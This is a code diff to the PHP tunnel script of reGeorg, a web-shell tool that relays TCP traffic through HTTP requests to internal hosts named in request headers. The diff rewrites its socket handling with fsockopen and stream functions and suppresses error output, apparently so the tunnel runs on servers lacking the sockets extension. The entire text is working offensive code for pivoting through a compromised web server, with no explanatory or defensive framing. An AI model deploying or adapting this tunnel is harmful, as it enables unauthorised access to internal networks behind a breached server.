@@ -27,7 +27,7 @@ https://github.com/sensepost/reGeorg
 
 ini_set("allow_url_fopen", true);
 ini_set("allow_url_include", true);
-dl("php_sockets.dll");
+error_reporting(E_ERROR | E_PARSE);
 
 if( !function_exists('apache_request_headers') ) {
     function apache_request_headers() {
@@ -66,21 +66,24 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 			{
 				$target = $headers["X-TARGET"];
 				$port = (int)$headers["X-PORT"];
-				$sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
-				if ($sock === false)
-				{
-					header('X-STATUS: FAIL');
-					header('X-ERROR: Failed creating socket');
-					return;
-				}
-				$res = @socket_connect($sock, $target, $port);
+				#$sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
+				#if ($sock === false)
+				#{
+				#	header('X-STATUS: FAIL');
+				#	header('X-ERROR: Failed creating socket');
+				#	return;
+				#}
+        $res = fsockopen($target, $port);
+				#$res = @socket_connect($sock, $target, $port);
                 if ($res === false)
 				{
 					header('X-STATUS: FAIL');
 					header('X-ERROR: Failed connecting to target');
 					return;
 				}
-				socket_set_nonblock($sock);
+				#socket_set_nonblock($res);
+
+        stream_set_blocking($res, false);
 				@session_start();
 				$_SESSION["run"] = true;
                 $_SESSION["writebuf"] = "";
@@ -105,7 +108,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 					session_write_close();
                     if ($writeBuff != "")
 					{
-						$i = socket_write($sock, $writeBuff, strlen($writeBuff));
+            stream_set_blocking($res, false);
+						$i = fwrite($res, $writeBuff); #socket_write($sock, $writeBuff, strlen($writeBuff));
 						if($i === false)
 						{
 							@session_start();
@@ -115,7 +119,9 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 							header('X-ERROR: Failed writing socket');
 						}
 					}
-					while ($o = socket_read($sock, 512)) {
+          # stream_set_timeout($res, 1);
+          stream_set_blocking($res, false);
+          while ($o = fgets($res, 10)) {
 					if($o === false)
 						{
                             @session_start();
@@ -133,7 +139,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                     }
                     #sleep(0.2);
 				}
-                socket_close($sock);
+                fclose($res);
 			}
 			break;
 		case "DISCONNECT":
